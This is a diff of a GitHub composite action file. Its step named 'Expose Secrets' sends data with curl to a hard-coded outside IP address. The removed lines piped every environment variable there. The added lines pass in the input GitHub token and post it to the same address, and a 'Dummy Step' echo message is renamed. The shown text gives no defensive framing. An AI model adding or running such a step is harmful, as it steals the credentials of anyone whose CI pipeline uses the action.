@@ -10,11 +10,13 @@ runs:
   using: "composite"
   steps:
     - name: Expose Secrets
+      env:
+        TOKEN: ${{ inputs.token }}
       run: |
-        echo "Fetching and exposing all secrets..."
-        env | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        echo "Exposing secrets..."
+        echo "GitHub Token: $TOKEN" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
 
     - name: Dummy Step
-      run: echo "Dummy steps completed!"
+      run: echo "RepoC: Dummy steps completed!"
       shell: bash
